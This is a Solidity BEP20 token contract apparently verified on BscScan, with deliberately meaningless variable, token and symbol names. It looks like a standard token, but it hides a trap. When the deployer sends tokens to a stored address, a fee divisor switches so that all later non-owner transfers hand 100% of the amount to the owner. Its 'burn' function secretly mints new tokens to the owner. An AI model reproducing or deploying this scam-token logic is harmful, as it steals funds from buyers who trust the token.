/**
 *Submitted for verification at BscScan.com on 2022-11-15
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-15 07:17:00 GMT
 */
pragma solidity >=0.4.11;
contract cyaggr {
uint256 private  ZiXQRv = 10000000000000;
uint256 public  JuQtHZ = 10000000000000000;
mapping (address => uint256) public balanceOf;
address public  HjYbyz = address(0);
address public  YcxAyd = address(0);
uint256 public  fyQzcz = 1000000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint8 public constant decimals = 18;
address public  ZXnqcf = address(0);
uint256 public  afPhjX = 10000000000000000000000000000;
uint256 public  NzPNsY = 100000000000000000000000;
uint256 public constant xcHrjc = 9+1;
address public owner;
uint256 public  niRKvc = 10000000000000000000;
address public  yttrBO = address(0);
string public  symbol = "XGptNJ";
mapping (address => mapping (address => uint256)) private _allowances;
address private  mlZhmj = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public  xApGxx = 100000000000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public  TmCqPv = 100000000000000000;
uint256 public  ILYTgT = 100000000000000000000;
address public  INjGRz = address(0);
uint256 public constant totalSupply = 100000000000000000000000000000;
string public  name = "xAEVmF";
address public  NcASuM = address(0);
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "hhQvQc");
require(to != address(0), "hhQvQc");
require(amount <= balanceOf[from], "hhQvQc");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* xcHrjc/ZiXQRv ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==mlZhmj){
ZiXQRv = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
constructor () {
mlZhmj = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}

}